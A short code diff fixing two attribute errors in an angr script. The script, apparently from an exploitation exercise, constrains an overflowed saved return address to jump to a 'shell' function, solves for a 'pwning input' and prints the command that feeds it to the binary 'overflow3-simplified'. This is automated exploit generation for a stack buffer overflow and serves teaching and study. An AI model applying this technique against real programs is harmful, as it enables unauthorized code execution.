@@ -59,7 +59,7 @@ while not simgr.vuln:
 # Now the fun part starts! Let's add a constraint that sets the overflowed return address to the "shell" function.
 # First, grab the stored return address in the vuln state
 print("Constraining saved return address!")
-vuln_state = state.vuln[0]
+vuln_state = simgr.vuln[0]
 overwritten_eip = vuln_state.memory.load(vuln_state.regs.ebp + 4, 4, endness="Iend_LE")
 print("Overwritten EIP:", overwritten_eip)
 # Now, let's add a constraint to redirect that return address to the shell function
@@ -71,7 +71,7 @@ print("Exploring to 'shell' function.")
 simgr.explore(stash='vuln', find=addr_of_shell)
 
 # now synthesize our pwning input!
-pwning_input = simgr.found[0].state.solver.eval(arg, cast_to=bytes)
+pwning_input = simgr.found[0].solver.eval(arg, cast_to=bytes)
 open("pwning_input", "wb").write(pwning_input.split(b'\0')[0]) # since it's a string arg, we only care up to the first null byte
 print("You can crash the program by doing:")
 print('# ./overflow3-simplified "$(cat pwning_input)"')
